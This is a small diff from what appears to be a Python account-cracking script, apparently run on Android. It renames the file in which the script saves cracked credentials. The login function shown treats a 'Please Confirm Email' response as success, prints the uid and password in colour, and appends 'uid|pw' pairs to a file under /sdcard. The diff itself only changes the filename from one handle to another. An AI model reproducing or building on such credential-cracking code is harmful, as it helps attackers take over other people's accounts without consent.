@@ -154,7 +154,7 @@ def login(uid):
                 break
             elif "Please Confirm Email" in str(rp):
                 print(f"\r\r{G}SUCCESS {A}➤ {G}{uid} {A}•{G} {pw}")
-                open("/sdcard/MrDevilEx-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
+                open("/sdcard/ABDUR -OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
             else:continue
